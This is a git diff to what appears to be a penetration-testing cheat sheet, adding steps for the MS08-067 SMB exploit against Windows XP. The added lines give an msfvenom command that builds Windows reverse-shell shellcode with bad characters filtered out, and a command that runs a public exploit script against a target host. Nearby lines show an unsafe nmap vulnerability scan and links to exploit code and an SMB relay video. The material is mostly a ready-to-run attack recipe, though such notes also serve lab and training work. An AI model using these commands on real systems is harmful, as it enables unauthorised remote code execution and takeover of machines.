@@ -154,6 +154,13 @@ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <IP>
 
 ### [Checking Windows XP for SMB Exploit]
 https://github.com/andyacer/ms08_067
+```
+Before executing the ms08_067 exploit you will need to craft your payload using msf venom and insert your payload into the exploit script.
+msfvenom -p windows/shell_reverse_tcp LHOST=<rhost> LPORT=<rport> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+
+After inserting your shellcode payload then you can execute your script. You may need to change your OS target number depending on the operating system.
+python ms08_067_2018.py <rhost> 1 445
+```
 
 ### [SMB Relay attack]
 https://www.youtube.com/watch?v=ctLVMi1_zBc&feature=emb_title
